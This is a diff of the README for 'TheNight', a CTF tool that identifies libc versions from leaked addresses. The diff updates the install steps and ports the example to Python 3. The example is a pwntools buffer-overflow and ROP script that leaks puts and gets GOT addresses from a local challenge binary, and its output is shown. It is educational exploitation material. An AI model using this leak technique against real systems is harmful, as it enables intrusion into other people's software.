@@ -35,15 +35,21 @@ It takes four arguments. The first one is the name of the first symbol you have 
 
 ## Setup
 
-To install `TheNight`, just run the setup script:
+To install `TheNight`, there are two parts. The first part is to download the libcs, the second is to install the python module. The libcs are downloaded from a git repo that is hosted by `monik3r` (`https://github.com/monik3r`). To download the binaries:
 
 ```
-$    sudo python setup.py
+$   python3 download.py
 ```
 
-This setup will essentially do three things. The first is it will scrape a bunch of libcs from `https://libc.blukat.me/` (will take a while). Then it will use `readelf` to grab symbols from all of the libcs (will not take a while). Lastly it will just copy `TheNight.py` to your python libraries directories. When it does the copy, it will edit the code for `TheNight.py` to point to your install directory. The install directory is the directory `setup.py` is in while it's running. If the installer worked correctly, you should be able to import `TheNight` from any directory on your system.
+To install the python module:
 
-If there is a custom libc you would like to add to `TheNight`, you can just copy it into the `/libcs/` directory, and then just rerun the installer. Although you might want to comment out the `grabLibcs` function, to save time by not rescraping `https://libc.blukat.me/`.
+```
+$   sudo python setup.py
+```
+
+These two scripts will essentially do three things. The first is it will scrape a bunch of libcs from `https://github.com/monik3r/libcFun`. Then it will use `readelf` to grab symbols from all of the libcs (will not take a while). Lastly it will just install the `thenight.py` module.
+
+If there is a custom libc you would like to add to `TheNight`, you can just copy it into the `/libcs/` directory, and then just rerun the installer. Although you might want to comment out the `grabLibcs` function, to save time by not rescraping.
 
 ## Example
 
@@ -82,10 +88,8 @@ $    pwn checksec baby_boi
 We can write a simple exploit which will just call `puts` twice, to leak the libc addresses for both `puts` and `gets`. If you want a more in depth explanation as to how that works, checkout `https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/csawquals17_svc`:
 
 ```
-$    cat idLibc.py
-import TheNight
+import thenight
 from pwn import *
-
 
 # Establish the target
 target = process('./baby_boi')
@@ -99,12 +103,12 @@ popRdi = p64(0x400793)
 puts = p64(elf.symbols["puts"])
 
 # Parse out some output
-print target.recvuntil("ere I am: ")
+print(target.recvuntil("ere I am: "))
 target.recvline()
 
 # Form our payload to leak libc address of puts and get by calling the plt address of puts twice, with it's argument being the got address of puts and then gets
-payload = ""
-payload += "0"*0x28         
+payload = b""
+payload += b"0"*0x28         
 payload += popRdi                    # Pop rdi ; ret
 payload += p64(elf.got["puts"])        # Got address for puts
 payload += puts                     # Plt address puts
@@ -116,48 +120,49 @@ payload += puts                     # Plt address puts
 target.sendline(payload)
 
 # Scan in the libc infoleaks
-leak0 = target.recvline().strip("\n")
-putsLibc = u64(leak0 + "\x00"*(8-len(leak0)))
+leak0 = target.recvline().strip(b"\n")
+putsLibc = u64(leak0 + b"\x00"*(8-len(leak0)))
 
-leak1 = target.recvline().strip("\n")
-getsLibc = u64(leak1 + "\x00"*(8-len(leak1)))
+leak1 = target.recvline().strip(b"\n")
+getsLibc = u64(leak1 + b"\x00"*(8-len(leak1)))
 
-print "puts libc: " + hex(putsLibc)
-print "gets libc: " + hex(getsLibc)
+print("puts libc: %s" % hex(putsLibc))
+print("gets libc: %s" % hex(getsLibc))
 
 # Pass the leaks to The Night to figure out
-TheNight.findLibcVersion("puts", putsLibc, "gets", getsLibc)
+thenight.find_libc_version("puts", putsLibc, "gets", getsLibc)
 
 target.interactive()
 ```
 
 When we run it:
 ```
-$    python idLibc.py
-[+] Starting local process './baby_boi': pid 23010
-[*] '/Hackery/The_Night/example/baby_boi'
+$   python3 id_libc.py 
+[+] Starting local process './baby_boi': pid 13778
+[*] '/Hackery/TheNight/example/baby_boi'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x400000)
-Hello!
-Here I am:
-puts libc: 0x7fde8adc0490
-gets libc: 0x7fde8adbfa40
-Offset:   0xa50
-Symbol0:  puts
-Symbol1:  gets
-Address0: 0x7fde8adc0490
-Address1: 0x7fde8adbfa40
-Possible libc: output-symbols-libc6_2.30-0ubuntu3_amd64.so
-Possible libc: output-symbols-libc6_2.30-0ubuntu2_amd64.so
+b'Hello!\nHere I am: '
+puts libc: 0x7fe3998fe5a0
+gets libc: 0x7fe3998fdaf0
+Offset:   0xab0
+Symbol_0:  puts
+Symbol_1:  gets
+Address0: 0x7fe3998fe5a0
+Address1: 0x7fe3998fdaf0
+Possible libc: output-symbols-libc6_2.30-0ubuntu3_i386.so
+Possible libc: output-symbols-libc6_2.30-0ubuntu2_i386.so
 [*] Switching to interactive mode
 [*] Got EOF while reading in interactive
 $  
+
 ```
 
 So the tool claims that we are using libc version `2.30`. When we check it in gdb, we see that is the case:
+
 
 ```
 $    gdb ./baby_boi
@@ -268,6 +273,10 @@ Also if you want, here is a writeup where I used this tool to help solve a ctf c
 https://github.com/guyinatuxedo/nightmare/tree/master/modules/08-bof_dynamic/utc19_shellme
 ```
 
+## Python2
+
+If for some reason you want a `Python2` version of this module, check in that subdirectory.
+
 ## Misc
 
 If anyone has any suggestions for this tool, this is probably the best place to reach me:
@@ -276,4 +285,10 @@ If anyone has any suggestions for this tool, this is probably the best place to 
 https://discord.gg/p5E3VZF
 ```
 
-Also as I do with all of my tools now, I named this one off of a super catchy metal song by Disturbed: `https://www.youtube.com/watch?v=YbwH5DADhDA`
+## What is The Night?
+
+The Night is a super catchy metal song by Disturbed:
+
+```
+https://www.youtube.com/watch?v=YbwH5DADhDA
+```
